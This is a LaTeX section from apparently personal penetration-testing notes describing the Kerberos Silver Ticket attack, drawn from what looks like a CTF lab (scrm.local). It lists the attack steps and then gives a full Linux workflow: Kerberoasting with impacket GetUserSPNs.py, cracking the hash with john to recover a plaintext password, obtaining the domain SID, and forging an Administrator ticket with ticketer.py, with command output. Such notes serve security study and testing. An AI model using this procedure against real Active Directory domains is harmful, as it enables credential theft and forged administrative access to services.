
\subsection{Silver Ticket Attack}
\url{https://en.hackndo.com/kerberos-silver-golden-tickets/}

Silver tickets are forged TGS. A silver ticket is similar to a Golden Ticket,
but does not have the broad administrative privileges of the golden ticket. 

An attacker would typically only gain access to a single service on an
application, and an attacker must have compromised legitimate user  credentials
.

What  makes these attacks very difficult to detect is that forging a silver
ticket (for example using the service account password hash) does not  require
any communication with a DC.

\url{https://m0chan.github.io/2019/07/31/How-To-Attack-Kerberos-101.html#kerberoast}

Whatever the circumstances, once an attacker has a foothold on a  single
network system, they can start laying the groundwork for forging a  Kerberos
Silver Ticket. This involves:
\begin{enumerate}
        \item Conduct reconnaissance to gather information about the domain,
            such as the domain name and domain security identifier (SID), both
            of which are relatively easily obtained by a whoami command on
            Windows.
        \item Obtain the DNS name under which the service principal name (SPN)
            for the targeted, local service they wish to attack is registered
            as well as the service type.
        \item Use Mimikatz~\ref{tool:mimikatz} or a similar
            tool to obtain the local NTLM passworda
            (or password hash) for the Kerberos service running on the
            compromised system, for example: Windows file share, SQL, email,
            Microsoft Sharepoint and so on. Service password hashes can be
            obtained from a number of sources on a compromised local system.
            For example, they can be dumped from the local computer’s Security
            Account Manager (SAM) or local service account.
        \item Obtain the unencrypted password for the service. These can be
            obtained from the hash using methods like offline cracking
            (“Kerberoasting”) to obtain the unencrypted password data.
        \item Use Mimikatz, ticketer~\ref{tool:impacket:tickerter} from
            impacket  or a similar tool to forge a Kerberos Ticket
            Granting Service (TGS) ticket allowing the attacker to authenticate
            to the targeted service.
        \item Authenticate to the local service directly using the credentials
            and forged TGS.
        \item Manipulate the TGS to elevate the attacker’s permissions to that
            of Domain Administrator.
\end{enumerate}

\subsubsection{Workflow on Linux}

\begin{itemize}
    \item find a service:
\begin{verbatim}
GetUserSPNs.py scrm.local/ksimpson:ksimpson -k  -dc-ip dc1.scrm.local

ServicePrincipalName          Name    MemberOf  PasswordLastSet             LastLogon                   Delegation
----------------------------  ------  --------  --------------------------  --------------------------  ----------
MSSQLSvc/dc1.scrm.local:1433  sqlsvc            2021-11-03 17:32:02.351452  2022-09-09 05:19:24.336275   
MSSQLSvc/dc1.scrm.local       sqlsvc            2021-11-03 17:32:02.351452  2022-09-09 05:19:24.336275   
\end{verbatim}

    \item Get it's info
\begin{verbatim}
$ GetUserSPNs.py scrm.local/ksimpson:ksimpson  -k  \
    -request-user sqlsvc  -outputfile sqlsvc.hash  \
    -dc-ip dc1.scrm.local
\end{verbatim}
    \item crack the password
\begin{verbatim}
$ john --wordlist=/usr/share/wordlists/passwor
ds/rockyou.txt sqlsvc.hash

$ john --show sqlsvc.hash
?:Pegasus60

1 password hash cracked, 0 left
\end{verbatim}
    \item Generate the NT hash from the password using for exemple
        \href{https://codebeautify.org/ntlm-hash-generator}{NTLM Hash
        Generator} (\verb+B999A16500B87D17EC7F2E2A68778F05+)
    \item Get domain SID using \verb+getPAC.py+
\begin{verbatim}
$ getPac.py -targetUser ksimpson scrm.local/ksimpson:ksimpson 
.. .
.. .
Domain SID: S-1-5-21-2743207045-1827831105-2542523200
\end{verbatim}   
    \item Identify the SID to impersonate using
        \href{https://morgantechspace.com/2013/10/difference-between-rid-and-sid-in.html}{Well
        Known SIDs} let say Administrator (500)
    \item Create the ticket
\begin{verbatim}
$ ticketer.py -nthash B999A16500B87D17EC7F2E2A68778F05 -domain-sid S-1-5-21-2743207045-1827831105-2542523200 -domain scrm.local -spn MSSQLSvc/scrm.local -user-id 500 Administrator
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for scrm.local/Administrator
[*]     PAC_LOGON_INFO
[*]     PAC_CLIENT_INFO_TYPE
[*]     EncTicketPart
[*]     EncTGSRepPart
[*] Signing/Encrypting final ticket
[*]     PAC_SERVER_CHECKSUM
[*]     PAC_PRIVSVR_CHECKSUM
[*]     EncTicketPart
[*]     EncTGSRepPart
[*] Saving ticket in Administrator.ccache
\end{verbatim}
\end{itemize}




